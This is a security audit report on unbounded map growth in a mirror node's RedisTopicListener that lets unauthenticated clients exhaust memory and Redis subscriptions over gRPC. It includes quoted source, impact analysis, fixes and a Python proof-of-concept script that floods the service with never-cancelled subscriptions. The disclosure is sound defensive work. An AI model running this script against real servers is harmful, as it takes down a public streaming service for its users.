# Audit Report

## Title
Unbounded `topicMessages` ConcurrentHashMap Growth via Distinct Topic ID Subscriptions in `RedisTopicListener`

## Summary
`RedisTopicListener.getSharedListener()` inserts one entry per unique topic ID into an unbounded `ConcurrentHashMap` and only removes entries when all subscribers to that topic cancel. Because there is no limit on total gRPC connections and the only per-connection throttle is `maxConcurrentCallsPerConnection = 5`, an attacker can open arbitrarily many connections, each subscribing to 5 distinct topic IDs while keeping them open indefinitely, causing the map and its backing Redis pub/sub subscriptions to grow without bound, exhausting JVM heap and Redis resources.

## Finding Description

`RedisTopicListener` declares and initializes an unbounded `ConcurrentHashMap` to track active topic subscriptions:

```java
// Line 33
private final Map<String, Flux<TopicMessage>> topicMessages;
// Line 43
this.topicMessages = new ConcurrentHashMap<>();
``` [1](#0-0) 

`getSharedListener()` inserts one entry per unique topic key via `computeIfAbsent`:

```java
protected Flux<TopicMessage> getSharedListener(TopicMessageFilter filter) {
    Topic topic = getTopic(filter);
    return topicMessages.computeIfAbsent(topic.getTopic(), key -> subscribe(topic));
}
``` [2](#0-1) 

The topic key is `"topic.<topicId>"`, so every distinct numeric topic ID produces a distinct map entry: [3](#0-2) 

Cleanup only occurs in `unsubscribe()`, wired to `doOnCancel` and `doOnComplete` of the shared `Flux`: [4](#0-3) 

The `.share()` operator (equivalent to `.publish().refCount()`) keeps the upstream Redis subscription alive as long as at least one downstream subscriber is active. An attacker who never cancels their subscription prevents `unsubscribe()` from ever firing for that topic key, permanently retaining the map entry and the Redis channel subscription. [5](#0-4) 

The only per-connection throttle is `maxConcurrentCallsPerConnection = 5`: [6](#0-5) 

Applied in `GrpcConfiguration` with no total-connection limit, no `maxConnectionAge`, and no cap on the total number of distinct topic entries: [7](#0-6) 

`ListenerProperties` provides only per-subscriber buffer sizing (`maxBufferSize`) — no global subscription count limit: [8](#0-7) 

**Failed assumption:** The design assumes that subscribers will eventually cancel, allowing `unsubscribe()` to reclaim map entries. There is no defensive bound enforced in code.

## Impact Explanation
Each map entry retains a live `Flux<TopicMessage>` backed by an active Redis pub/sub channel subscription. Flooding the map with thousands of entries simultaneously exhausts JVM heap (leading to `OutOfMemoryError`) and Redis connection/channel limits. Either outcome causes the gRPC layer to drop or misroute all topic message deliveries, constituting a denial-of-service against the mirror node's consensus message streaming service.

## Likelihood Explanation
The attack requires no credentials, no privileged access, and no knowledge of internal state — only the ability to open TCP connections to the gRPC port (default 5600) and issue valid `subscribeTopic` RPCs with distinct topic IDs. It is fully scriptable, repeatable, and can be sustained indefinitely by keeping connections open. Valid topic IDs on a public Hedera network are sequential and trivially enumerable.

## Recommendation
1. **Cap the map size:** Enforce a maximum number of concurrent topic subscriptions (e.g., using a `LRU`-bounded map or an explicit counter with rejection logic) so that `computeIfAbsent` fails gracefully beyond a configured threshold.
2. **Limit total gRPC connections:** Configure `NettyServerBuilder.maxConnectionAge()` and `maxConnectionAgeGrace()` to force periodic connection recycling, and consider `maxConnections` via a connection limiter to bound total simultaneous clients.
3. **Add a global subscription counter:** Track total active subscriptions across all topics and reject new `subscribeTopic` RPCs when the limit is reached, returning `RESOURCE_EXHAUSTED` to the caller.
4. **Idle-subscription timeout:** Implement a server-side idle timeout that cancels subscriptions that have received no messages and no client activity within a configurable window.

## Proof of Concept
```python
import grpc
import threading

# Assumes proto stubs for the mirror node consensus service
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2

TARGET = "mirror-node:5600"
TOPICS_PER_CONN = 5
NUM_CONNECTIONS = 1000  # 5000 distinct topic IDs total

def open_subscriptions(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    for i in range(TOPICS_PER_CONN):
        topic_id = conn_id * TOPICS_PER_CONN + i
        req = consensus_service_pb2.ConsensusTopicQuery(
            topic_id={"topicNum": topic_id}
        )
        # Start streaming but never consume/cancel — keeps subscription alive
        stub.subscribeTopic(req)
    # Block forever, keeping all subscriptions open
    threading.Event().wait()

threads = [threading.Thread(target=open_subscriptions, args=(i,))
           for i in range(NUM_CONNECTIONS)]
for t in threads:
    t.start()
for t in threads:
    t.join()
```

After `NUM_CONNECTIONS × TOPICS_PER_CONN` iterations, `topicMessages` contains 5,000 entries, each backed by a live Redis channel subscription, with no cleanup path available until the attacker drops connections.
